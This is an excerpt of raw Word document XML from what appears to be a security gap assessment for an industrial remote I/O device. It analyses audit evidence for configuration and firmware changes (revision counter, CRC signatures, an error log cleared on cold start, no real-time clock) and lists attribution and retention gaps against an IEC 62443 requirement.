          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE:</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Repudiation (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering-on-audit</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (cold-start clears the Error Log; MITRE ATT&amp;CK for ICS </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>T0872</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>). No change.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4337DA36" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50BB1A2A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Configuration-modification evidence surface (primary — REVISION_COUNTER/I&amp;M4 now correctly here):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1821"/>
        <w:gridCol w:w="1413"/>
        <w:gridCol w:w="3149"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="45A34B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E7A137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207A4C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Documentation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007BBE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Evidences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980276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Failure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mode</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="4FA5C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47B85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REVISION_COUNTER (I&amp;M0)</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>increments</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> on </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>parameter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change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36E8A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>SRIO-3002/3015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47A13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i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>That</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> config changed (a </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>count</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380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C11DC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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Remanent → durable count</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; but no time/actor, </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>wraps at 0xFFFF</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (G-2/G-3/G-5) </w:t>
            </w:r>
            <w:hyperlink r:id="rId218" w:history="1">
              <w:r w:rsidRPr="00576380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576380">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00576380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DC3DB6" w:rsidRPr="00576380" w14:paraId="2D936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8EEEC" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> change on modification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2ADCC" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>SRIO-12627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251B0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t>Config</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fingerprint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delta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499F7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 xml:space="preserve">Fingerprint, not an event; no time/actor </w:t>
            </w:r>
            <w:hyperlink r:id="rId219" w:history="1">
              <w:r w:rsidRPr="00576380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576380">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00576380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DC3DB6" w:rsidRPr="00576380" w14:paraId="304FB2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CAED2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 xml:space="preserve">I&amp;M4 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>signature</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>F_iParCRC+F_Par_CRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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B62D1" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>SRIO-3011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AAC10" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Current-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>config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signature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7CE3C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 xml:space="preserve">Runtime-regenerated, not remanent; compare-over-time only </w:t>
            </w:r>
            <w:hyperlink r:id="rId220" w:history="1">
              <w:r w:rsidRPr="00576380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576380">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00576380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DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="2BDD9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88F17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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Acyclic config write blocked after param-end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6596C" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>SRIO-7749/7684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145A6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 xml:space="preserve">Temporal integrity </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>(config changeable only in Param phase)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9BABC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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Partial </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>when</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>-control</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>generates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no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evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId221" w:history="1">
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6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6F2DC7DE" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Firmware-modification evidence surface (cross-referenced — not re-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>analysed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US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6"/>
        <w:gridCol w:w="1103"/>
        <w:gridCol w:w="2673"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="0FE4F6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597EEB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66CD2B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Home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D9D59F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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="24EB5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1A47C" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">FW/HW </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>compatibility</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> check + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>error</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">-log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>entry</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>; /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>version+SOFTWARE_REVISION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delta</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>self-erasing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install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00057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RQ-008</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (TC-RQ008-02)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9D489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 xml:space="preserve">Firmware-intervention evidence is RQ-008; RQ-009 cross-references it for the </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>modification</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> framing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7394FB23" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3573647A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (attribution — config-specific, delegated not absent).</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> For </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, the modification is </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not performed on the device</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: it is authored in the engineering tool, stored on the (password-protected) PLC, and pushed via fieldbus (SRIO-1983; System-Architecture: SRIO config "saved on the PLC, typically password-protected"). So the </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>actor is knowable — only at the PLC/engineering-tool layer, not device-resident.</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attribution is </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>architecturally delegated, not absent</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → device-level CR 2.12 impossible for this QM slave. </w:t>
      </w:r>
      <w:hyperlink r:id="rId222" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="26E2726A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (time — decisive).</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> No RTC; uptime resets on cold start → modifications not datable. Even the durable REVISION_COUNTER carries </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — a </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>count</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is retained but its </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>timing</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is lost. </w:t>
      </w:r>
      <w:hyperlink r:id="rId223" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="584C1B08" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (asymmetric retention — the config-specific nuance).</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>REVISION_COUNTER is I&amp;M0 device data and survives cold start</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (durable count), whereas the </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Error-Log event detail is cleared on cold start</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the two config-evidence classes </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fail differently</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: durable-but-detail-less count vs informative-but-volatile log. </w:t>
      </w:r>
      <w:hyperlink r:id="rId224" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7AB5E987" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="28" w:author="Unknown">
        <w:r w:rsidRPr="00576380">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>G-4 (self-erasing firmware modification)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cross-referenced to RQ-008 (G-3 / TC-RQ008-02).</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The firmware-modification limb inherits RQ-008's self-erasing install; not re-tested here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCCE844" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-5 (counter saturation — config-specific).</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> REVISION_COUNTER </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>wraps at 0xFFFF</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> over the 20-year mission time (SRIO-706) with frequent re-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>parameterisation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → bounded evidence. </w:t>
      </w:r>
      <w:hyperlink r:id="rId225" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
